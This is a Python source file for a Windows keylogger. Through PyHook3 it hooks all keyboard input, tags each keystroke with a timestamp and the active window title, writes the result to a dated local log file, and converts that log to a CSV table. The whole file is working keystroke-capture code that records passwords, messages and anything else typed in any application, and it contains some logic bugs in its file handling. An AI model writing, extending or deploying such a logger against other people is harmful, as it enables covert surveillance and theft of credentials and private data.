#Created by Mantie N Reid II

import PyHook3
import numpy.random.common
import numpy.random.bounded_integers
import numpy.random.entropy
import pythoncom
from datetime import datetime
import  pandas as pd
import win32gui



def ConvertToTable():
  # print("The convert to table function is running.")
  datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
  try:
    f=open(datelogname + '-logfile.txt','r')
  except FileNotFoundError:
    print("the file was not found. But keep going, it will be converted after  the text file created")
    return


  df = pd.read_csv(f, sep='|',encoding= "ISO-8859-1", names=["TimeStamp", "Current Window", "KeyStrokes"] )
  df.to_csv(datelogname +'-LogFileTable.csv', index=None,)
  # print("The function has converted the text file to a table")



def GiveNewLine():  # this will open the file and make the first line start with the timestamp next to it.  Ensures it starts with a datetimestamp on the first line at start.
  datelogname = datetime.today().strftime('%m-%d-%Y')

  datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')
  w = win32gui
  currentwindow = w.GetWindowText (w.GetForegroundWindow())

  #print(w.GetWindowText (w.GetForegroundWindow()))
  logfile = open(datelogname + "-logfile.txt", 'a+')


  #print(windowname)
  logfile.write("\n" + datetimestamp + "|" + currentwindow + "|" + " ")  # Adds a new line. Enters the current date, time, and current window
  logfile.close()



# Define a new function for the keylogger

# sg.Popup('Hello from pysimple!', ' This is the shortest GUI program ever!')

# def somefunction(event):
 # currentwindow = windowname
  # return True




def OnKeyboardEvent(event):
    global windowname

    # print("The most important function called onkeyboard event has started running")
    w = win32gui
    currentwindow = w.GetWindowText(w.GetForegroundWindow())

    datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
    datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')  # to be used for timestamping the date and time the keys were pressed
    logfile = open( datelogname + '-logfile.txt', 'a+')   # open the file  in append mode. If the file does not exist, then create the file and open it in append mode.
    buffers = logfile.read()

    logfile.close()


    # open the file to write the current new keystrokes.

    logfile = open(datelogname + "-logfile.txt", 'a+')

    apples = 2
    windowname = event.WindowName
    keylogs = chr(event.Ascii)

    windownameholder = windowname

    #print('Time:', event.Time)

    #print("window name is " + windowname)
    #print("windowname holder is " +  windownameholder)

    def NewLineIfWindowChanges():
      w = win32gui
      currentwindow = w.GetWindowText(w.GetForegroundWindow())

      datelogname = datetime.today().strftime('%m-%d-%Y')
      datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')
      with open(datelogname + "-logfile.txt", 'r') as fh:

        data = fh.readlines()

        try:
          lastline = data[-5]
        except IndexError:
          print('The last line has not been written yet, exit function and keep going')
          return




      # print('test')
      # print(str(windowname) in str(lastline))
      # print("The window has changed")
      # logfile2 = open(datelogname + "-logfile.txt", 'a+')
      # logfile2.write("\n" + datetimestamp + "|" + currentwindow + "|" + " ")
      # logfile2.close()
      if str(lastline).find(str(windowname)) != -1:
        'print("The window name  has not changed")'

      else:

        logfile2 = open(datelogname + "-logfile.txt", 'a+')
        logfile2.write("\n" + datetimestamp + "|" + currentwindow + "|" + " ")
        logfile2.close()
        print("the window has  changed")


    if event.Ascii == 13 :  # if entered is pressed, then start a new line, add datetimestamp, windowname and delimter
        keylogs = '\n' + datetimestamp + "|" + currentwindow + "|" + " "

    if event.Ascii == 8:  # if backspace is used, then convert it to the word, back space. This is done to prevent it from showing up as a box.
        keylogs =' <Backspace> '

    if event.Ascii == 9:
        keylogs =' <Tab> '

    windowid =  event.Window



    buffers += keylogs   # Whatever is keylogs equal to, Gets added to the buffers variable.
    NewLineIfWindowChanges()

    logfile.write(buffers)  # writes the key pressed  to the file

    logfile.close()   # closes the file
    #print("Onkeyboard function has come to the end of its function")
    ConvertToTable()


    return True








  # watch for all keyboard events





def main():
  hm = PyHook3.HookManager()
  hm.KeyDown = OnKeyboardEvent

  hm.HookKeyboard()


  pythoncom.PumpMessages()

  GiveNewLine()





if __name__== "__main__":
  print("The program has started, Start typing!")
  main()





